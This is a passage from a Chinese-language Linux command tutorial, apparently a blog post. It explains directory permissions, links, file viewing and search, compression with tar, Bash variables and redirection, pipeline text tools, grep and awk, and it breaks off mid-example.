title="目录的权限"></a>目录的权限</h2><p>文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。</p><p>目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ln [-sf] source_filename dist_filename</span><br><span class="line">-s ：默认是 hard link，加 -s 为 symbolic link</span><br><span class="line">-f ：如果目标文件存在时，先删除目标文件</span><br></pre></td></tr></table></figure><h3 id="1-实体链接"><a href="#1-实体链接" class="headerlink" title="1. 实体链接"></a>1. 实体链接</h3><p>它和普通文件类似，实体链接文件的 inode 都指向源文件所在的 block 上，也就是说读取文件直接从源文件的 block 上读取。</p><p>删除任意一个条目，文件还是存在，只要引用数量不为 0。</p><p>有以下限制：不能跨越 File System、不能对目录进行链接。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ln /etc/crontab .</span><br><span class="line"># ll -i /etc/crontab crontab</span><br><span class="line">34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab</span><br><span class="line">34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab</span><br></pre></td></tr></table></figure><h3 id="2-符号链接"><a href="#2-符号链接" class="headerlink" title="2. 符号链接"></a>2. 符号链接</h3><p>符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。</p><p>当源文件被删除了，链接文件就打不开了。</p><p>可以为目录建立链接。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ll -i /etc/crontab /root/crontab2</span><br><span class="line">34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab</span><br><span class="line">53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -&gt; /etc/crontab</span><br></pre></td></tr></table></figure><h2 id="获取文件内容"><a href="#获取文件内容" class="headerlink" title="获取文件内容"></a>获取文件内容</h2><h3 id="1-cat"><a href="#1-cat" class="headerlink" title="1. cat"></a>1. cat</h3><p>取得文件内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cat [-AbEnTv] filename</span><br><span class="line">-n ：打印出行号，连同空白行也会有行号，-b 不会</span><br></pre></td></tr></table></figure><h3 id="2-tac"><a href="#2-tac" class="headerlink" title="2. tac"></a>2. tac</h3><p>是 cat 的反向操作，从最后一行开始打印。</p><h3 id="3-more"><a href="#3-more" class="headerlink" title="3. more"></a>3. more</h3><p>和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。</p><h3 id="4-less"><a href="#4-less" class="headerlink" title="4. less"></a>4. less</h3><p>和 more 类似，但是多了一个向前翻页的功能。</p><h3 id="5-head"><a href="#5-head" class="headerlink" title="5. head"></a>5. head</h3><p>取得文件前几行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># head [-n number] filename</span><br><span class="line">-n ：后面接数字，代表显示几行的意思</span><br></pre></td></tr></table></figure><h3 id="6-tail"><a href="#6-tail" class="headerlink" title="6. tail"></a>6. tail</h3><p>是 head 的反向操作，只是取得是后几行。</p><h3 id="7-od"><a href="#7-od" class="headerlink" title="7. od"></a>7. od</h3><p>以字符或者十六进制的形式显示二进制文件。</p><h2 id="指令与文件搜索"><a href="#指令与文件搜索" class="headerlink" title="指令与文件搜索"></a>指令与文件搜索</h2><h3 id="1-which"><a href="#1-which" class="headerlink" title="1. which"></a>1. which</h3><p>指令搜索。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># which [-a] command</span><br><span class="line">-a ：将所有指令列出，而不是只列第一个</span><br></pre></td></tr></table></figure><h3 id="2-whereis"><a href="#2-whereis" class="headerlink" title="2. whereis"></a>2. whereis</h3><p>文件搜索。速度比较快，因为它只搜索几个特定的目录。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># whereis [-bmsu] dirname/filename</span><br></pre></td></tr></table></figure><h3 id="3-locate"><a href="#3-locate" class="headerlink" title="3. locate"></a>3. locate</h3><p>文件搜索。可以用关键字或者正则表达式进行搜索。</p><p>locate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># locate [-ir] keyword</span><br><span class="line">-r：正则表达式</span><br></pre></td></tr></table></figure><h3 id="4-find"><a href="#4-find" class="headerlink" title="4. find"></a>4. find</h3><p>文件搜索。可以使用文件的属性和权限进行搜索。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># find [basedir] [option]</span><br><span class="line">example: find . -name "shadow*"</span><br></pre></td></tr></table></figure><p>（一）与时间有关的选项</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-mtime  n ：列出在 n 天前的那一天修改过内容的文件</span><br><span class="line">-mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件</span><br><span class="line">-mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件</span><br><span class="line">-newer file ： 列出比 file 更新的文件</span><br></pre></td></tr></table></figure><p>+4、4 和 -4 的指示的时间范围如下：</p><p><div align="center"> <img src="/images/posts/658fc5e7-79c0-4247-9445-d69bf194c539.png" width=""> </div><br></p><p>（二）与文件拥有者和所属群组有关的选项</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-uid n</span><br><span class="line">-gid n</span><br><span class="line">-user name</span><br><span class="line">-group name</span><br><span class="line">-nouser ：搜索拥有者不存在 /etc/passwd 的文件</span><br><span class="line">-nogroup：搜索所属群组不存在于 /etc/group 的文件</span><br></pre></td></tr></table></figure><p>（三）与文件权限和名称有关的选项</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-name filename</span><br><span class="line">-size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k</span><br><span class="line">-type TYPE</span><br><span class="line">-perm mode  ：搜索权限等于 mode 的文件</span><br><span class="line">-perm -mode ：搜索权限包含 mode 的文件</span><br><span class="line">-perm /mode ：搜索权限包含任一 mode 的文件</span><br></pre></td></tr></table></figure><h1 id="六、压缩与打包"><a href="#六、压缩与打包" class="headerlink" title="六、压缩与打包"></a>六、压缩与打包</h1><h2 id="压缩文件名"><a href="#压缩文件名" class="headerlink" title="压缩文件名"></a>压缩文件名</h2><p>Linux 底下有很多压缩文件名，常见的如下：</p><table><thead><tr><th>扩展名</th><th>压缩程序</th></tr></thead><tbody><tr><td>*.Z</td><td>compress</td></tr><tr><td>*.zip</td><td>zip</td></tr><tr><td>*.gz</td><td>gzip</td></tr><tr><td>*.bz2</td><td>bzip2</td></tr><tr><td>*.xz</td><td>xz</td></tr><tr><td>*.tar</td><td>tar 程序打包的数据，没有经过压缩</td></tr><tr><td>*.tar.gz</td><td>tar 程序打包的文件，经过 gzip 的压缩</td></tr><tr><td>*.tar.bz2</td><td>tar 程序打包的文件，经过 bzip2 的压缩</td></tr><tr><td>*.tar.xz</td><td>tar 程序打包的文件，经过 xz 的压缩</td></tr></tbody></table><h2 id="压缩指令"><a href="#压缩指令" class="headerlink" title="压缩指令"></a>压缩指令</h2><h3 id="1-gzip"><a href="#1-gzip" class="headerlink" title="1. gzip"></a>1. gzip</h3><p>gzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。</p><p>经过 gzip 压缩过，源文件就不存在了。</p><p>有 9 个不同的压缩等级可以使用。</p><p>可以使用 zcat、zmore、zless 来读取压缩文件的内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gzip [-cdtv#] filename</span><br><span class="line">-c ：将压缩的数据输出到屏幕上</span><br><span class="line">-d ：解压缩</span><br><span class="line">-t ：检验压缩文件是否出错</span><br><span class="line">-v ：显示压缩比等信息</span><br><span class="line">-# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6</span><br></pre></td></tr></table></figure><h3 id="2-bzip2"><a href="#2-bzip2" class="headerlink" title="2. bzip2"></a>2. bzip2</h3><p>提供比 gzip 更高的压缩比。</p><p>查看命令：bzcat、bzmore、bzless、bzgrep。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ bzip2 [-cdkzv#] filename</span><br><span class="line">-k ：保留源文件</span><br></pre></td></tr></table></figure><h3 id="3-xz"><a href="#3-xz" class="headerlink" title="3. xz"></a>3. xz</h3><p>提供比 bzip2 更佳的压缩比。</p><p>可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。</p><p>查看命令：xzcat、xzmore、xzless、xzgrep。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xz [-dtlkc#] filename</span><br></pre></td></tr></table></figure><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gip、bzip2、xz 将打包文件进行压缩。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename...  ==打包压缩</span><br><span class="line">$ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件]              ==查看</span><br><span class="line">$ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录]    ==解压缩</span><br><span class="line">-z ：使用 zip；</span><br><span class="line">-j ：使用 bzip2；</span><br><span class="line">-J ：使用 xz；</span><br><span class="line">-c ：新建打包文件；</span><br><span class="line">-t ：查看打包文件里面有哪些文件；</span><br><span class="line">-x ：解打包或解压缩的功能；</span><br><span class="line">-v ：在压缩/解压缩的过程中，显示正在处理的文件名；</span><br><span class="line">-f : filename：要处理的文件；</span><br><span class="line">-C 目录 ： 在特定目录解压缩。</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">使用方式</th><th>命令</th></tr></thead><tbody><tr><td style="text-align:center">打包压缩</td><td>tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称</td></tr><tr><td style="text-align:center">查 看</td><td>tar -jtv -f filename.tar.bz2</td></tr><tr><td style="text-align:center">解压缩</td><td>tar -jxv -f filename.tar.bz2 -C 要解压缩的目录</td></tr></tbody></table><h1 id="七、Bash"><a href="#七、Bash" class="headerlink" title="七、Bash"></a>七、Bash</h1><p>可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li><p>命令历史：记录使用过的命令。本次登录所执行的命令都会暂时存放到内存中，~/.bash_history 文件中记录的是前一次登录所执行过的命令。</p></li><li><p>命令与文件补全：快捷键：tab。</p></li><li><p>命名别名：例如 lm 是 ls -al 的别名。</p></li><li><p>shell scripts。</p></li><li><p>通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件。</p></li></ul><h2 id="变量操作"><a href="#变量操作" class="headerlink" title="变量操作"></a>变量操作</h2><p>对一个变量赋值直接使用 =。</p><p>对变量取用需要在变量前加上 \$ ，也可以用 \${} 的形式；</p><p>输出变量使用 echo 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ var=abc</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$var</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$&#123;var&#125;</span></span><br></pre></td></tr></table></figure><p>变量内容如果有空格，必须需要使用双引号或者单引号。</p><ul><li>双引号内的特殊字符可以保留原本特性，例如 var=”lang is \$LANG”，则 var 的值为 lang is zh_TW.UTF-8；</li><li>单引号内的特殊字符就是特殊字符本身，例如 var=’lang is \$LANG’，则 var 的值为 lang is \$LANG。</li></ul><p>可以使用 `指令` 或者 \$(指令) 的方式将指令的执行结果赋值给变量。例如 version=\$(uname -r)，则 version 的值为 3.10.0-229.el7.x86_64。</p><p>可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。</p><p>Bash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ declare [-aixr] variable</span><br><span class="line">-a ： 定义为数组类型</span><br><span class="line">-i ： 定义为整数类型</span><br><span class="line">-x ： 定义为环境变量</span><br><span class="line">-r ： 定义为 readonly 类型</span><br></pre></td></tr></table></figure><p>使用 [ ] 来对数组进行索引操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ array[1]=a</span><br><span class="line">$ array[2]=b</span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$&#123;array[1]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="指令搜索顺序"><a href="#指令搜索顺序" class="headerlink" title="指令搜索顺序"></a>指令搜索顺序</h2><ol><li>以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ；</li><li>由别名找到该指令来执行；</li><li>由 Bash 内建的指令来执行；</li><li>按 \$PATH 变量指定的搜索路径的顺序找到第一个指令来执行。</li></ol><h2 id="数据流重定向"><a href="#数据流重定向" class="headerlink" title="数据流重定向"></a>数据流重定向</h2><p>重定向指的是使用文件代替标准输入、标准输出和标准错误输出。</p><table><thead><tr><th style="text-align:center">1</th><th style="text-align:center">代码</th><th style="text-align:center">运算符</th></tr></thead><tbody><tr><td style="text-align:center">标准输入 (stdin)</td><td style="text-align:center">0</td><td style="text-align:center">&lt; 或 &lt;&lt;</td></tr><tr><td style="text-align:center">标准输出 (stdout)</td><td style="text-align:center">1</td><td style="text-align:center">&gt; 或 &gt;&gt;</td></tr><tr><td style="text-align:center">标准错误输出 (stderr)</td><td style="text-align:center">2</td><td style="text-align:center">2&gt; 或 2&gt;&gt;</td></tr></tbody></table><p>其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。</p><p>可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。</p><p>如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2&gt;&amp;1 表示将标准错误输出转换为标准输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find /home -name .bashrc &gt; list 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h1 id="八、管线指令"><a href="#八、管线指令" class="headerlink" title="八、管线指令"></a>八、管线指令</h1><p>管线是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管线。在命令之间使用 | 分隔各个管线命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al /etc | less</span><br></pre></td></tr></table></figure><h2 id="提取指令"><a href="#提取指令" class="headerlink" title="提取指令"></a>提取指令</h2><p>cut 对数据进行切分，取出想要的部分。切分过程一行一行地进行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cut</span><br><span class="line">-d ：分隔符</span><br><span class="line">-f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间</span><br><span class="line">-c ：以字符为单位取出区间</span><br></pre></td></tr></table></figure><p>范例 1：last 将显示的登入者的信息，要求仅显示用户名。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ last</span><br><span class="line">root pts/1 192.168.201.101 Sat Feb 7 12:35 still logged in</span><br><span class="line">root pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)</span><br><span class="line">root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16)</span><br><span class="line"></span><br><span class="line">$ last | cut -d ' ' -f 1</span><br></pre></td></tr></table></figure><p>范例 2：将 export 输出的讯息，取得第 12 字符以后的所有字符串。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ export</span><br><span class="line">declare -x HISTCONTROL="ignoredups"</span><br><span class="line">declare -x HISTSIZE="1000"</span><br><span class="line">declare -x HOME="/home/dmtsai"</span><br><span class="line">declare -x HOSTNAME="study.centos.vbird"</span><br><span class="line">.....(其他省略).....</span><br><span class="line"></span><br><span class="line">$ export | cut -c 12</span><br></pre></td></tr></table></figure><h2 id="排序指令"><a href="#排序指令" class="headerlink" title="排序指令"></a>排序指令</h2><p><strong>sort</strong>  进行排序。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sort [-fbMnrtuk] [file or stdin]</span><br><span class="line">-f ：忽略大小写</span><br><span class="line">-b ：忽略最前面的空格</span><br><span class="line">-M ：以月份的名字来排序，例如 JAN，DEC</span><br><span class="line">-n ：使用数字</span><br><span class="line">-r ：反向排序</span><br><span class="line">-u ：相当于 unique，重复的内容只出现一次</span><br><span class="line">-t ：分隔符，默认为 tab</span><br><span class="line">-k ：指定排序的区间</span><br></pre></td></tr></table></figure><p>范例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passwd | sort -t ':' -k 3</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">dmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bash</span><br><span class="line">alex:x:1001:1002::/home/alex:/bin/bash</span><br><span class="line">arod:x:1002:1003::/home/arod:/bin/bash</span><br></pre></td></tr></table></figure><p><strong>uniq</strong>  可以将重复的数据只取一个。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ uniq [-ic]</span><br><span class="line">-i ：忽略大小写</span><br><span class="line">-c ：进行计数</span><br></pre></td></tr></table></figure><p>范例：取得每个人的登录总次数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ last | cut -d ' ' -f 1 | sort | uniq -c</span><br><span class="line">1</span><br><span class="line">6 (unknown</span><br><span class="line">47 dmtsai</span><br><span class="line">4 reboot</span><br><span class="line">7 root</span><br><span class="line">1 wtmp</span><br></pre></td></tr></table></figure><h2 id="双向输出重定向"><a href="#双向输出重定向" class="headerlink" title="双向输出重定向"></a>双向输出重定向</h2><p>输出重定向会将输出内容重定向到文件中，而  <strong>tee</strong>  不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tee [-a] file</span><br></pre></td></tr></table></figure><h2 id="字符转换指令"><a href="#字符转换指令" class="headerlink" title="字符转换指令"></a>字符转换指令</h2><p><strong>tr</strong>  用来删除一行中的字符，或者对字符进行替换。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tr [-ds] SET1 ...</span><br><span class="line">-d ： 删除行中 SET1 这个字符串</span><br></pre></td></tr></table></figure><p>范例，将 last 输出的信息所有小写转换为大写。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ last | tr '[a-z]' '[A-Z]'</span><br></pre></td></tr></table></figure><p>  <strong>col</strong>  将 tab 字符转为空格字符。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ col [-xb]</span><br><span class="line">-x ： 将 tab 键转换成对等的空格键</span><br></pre></td></tr></table></figure><p><strong>expand</strong>  将 tab 转换一定数量的空格，默认是 8 个。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ expand [-t] file</span><br><span class="line">-t ：tab 转为空格的数量</span><br></pre></td></tr></table></figure><p><strong>join</strong>  将有相同数据的那一行合并在一起。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ join [-ti12] file1 file2</span><br><span class="line">-t ：分隔符，默认为空格</span><br><span class="line">-i ：忽略大小写的差异</span><br><span class="line">-1 ：第一个文件所用的比较字段</span><br><span class="line">-2 ：第二个文件所用的比较字段</span><br></pre></td></tr></table></figure><p><strong>paste</strong>  直接将两行粘贴在一起。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ paste [-d] file1 file2</span><br><span class="line">-d ：分隔符，默认为 tab</span><br></pre></td></tr></table></figure><h2 id="分区指令"><a href="#分区指令" class="headerlink" title="分区指令"></a>分区指令</h2><p><strong>split</strong>  将一个文件划分成多个文件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ split [-bl] file PREFIX</span><br><span class="line">-b ：以大小来进行分区，可加单位，例如 b, k, m 等</span><br><span class="line">-l ：以行数来进行分区。</span><br><span class="line">- PREFIX ：分区文件的前导名称</span><br></pre></td></tr></table></figure><h1 id="九、正则表达式"><a href="#九、正则表达式" class="headerlink" title="九、正则表达式"></a>九、正则表达式</h1><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>使用正则表示式把匹配的行提取出来。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ grep [-acinv] [--color=auto] 搜寻字符串 filename</span><br><span class="line">-a ： 将 binary 文件以 text 文件的方式进行搜寻</span><br><span class="line">-c ： 计算找到个数</span><br><span class="line">-i ： 忽略大小写</span><br><span class="line">-n ： 输出行号</span><br><span class="line">-v ： 反向选择，亦即显示出没有 搜寻字符串 内容的那一行</span><br><span class="line">--color=auto ：找到的关键字加颜色显示</span><br></pre></td></tr></table></figure><p>范例：把含有 the 字符串的行提取出来（注意默认会有 –color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ grep -n 'the' regular_express.txt</span><br><span class="line">8:I can't finish the test.</span><br><span class="line">12:the symbol '*' is represented as start.</span><br><span class="line">15:You are the best is mean you are the no. 1.</span><br><span class="line">16:The world Happy is the same with "glad".</span><br><span class="line">18:google is the best tools for search keyword</span><br></pre></td></tr></table></figure><p>因为 { 和 } 在 shell 是有特殊意义的，因此必须要使用转义字符进行转义。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep -n 'go\&#123;2,5\&#125;g' regular_express.txt</span><br></pre></td></tr></table></figure><h2 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h2><p>用于格式化输出。</p><p>它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ printf '%10s %5i %5i %5i %8.2f \n' $(cat printf.txt)</span><br><span class="line">    DmTsai    80    60    92    77.33</span><br><span class="line">     VBird    75    55    80    70.00</span><br><span class="line">       Ken    60    90    70    73.33</span><br></pre></td></tr></table></figure><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk '条件类型 1 &#123;动作 1&#125; 条件类型 2 &#123;动作 2&#125; ...' filename</span><br></pre></td></tr></table></figure><p>awk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：\$n，n 为字段号，从 1 开始，\$0 表示一整行。</p><p>范例 1：取出登录用户的用户名和 ip</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ last -n 5</span><br><span class="line">dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged in</span><br><span class="line">dmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)</span><br><span class="line">dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)</span><br><span class="line">dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)</span><br><span class="line">dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15)</span><br><span class="line"></span><br><span class="line">$ last -n 5 | awk '&#123;print $1 "\t" $3&#125;</span><br></pre></td></tr></table></figure><p>awk 变量：</p><table><thead><tr><th>变量名称</th><th>代表意义</th></tr></thead><tbody><tr><td>NF</td><td>每一行拥有的字段总数</td></tr><tr><td>NR</td><td>目前所处理的是第几行数据</td></tr><tr><td>FS</td><td>目前的分隔字符，默认是空格键</td></tr></tbody></table><p>范例 2：输出正在处理的行号，并显示每一行有多少字段</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ last -n 5 | awk '&#123;print $1 "\t lines: " NR "\t columns: " NF&#125;'</span><br><span class="line">dmtsai lines: 1 columns: 10</span><br><span class="line">dmtsai lines: 2 columns: 10</span><br><span class="line">dmtsai lines: 3 columns: 10</span><br><span class="line">dmtsai lines: 4 columns: 10</span><br><span class="line">dmtsai lines: 5 columns: 9</span><br></pre></td></tr></table></figure><p>可以使用条件，其中等于使用 ==。</p><p>范例 3：/etc/passwd 文件第三个字段为 UID，对 UID 小于 10 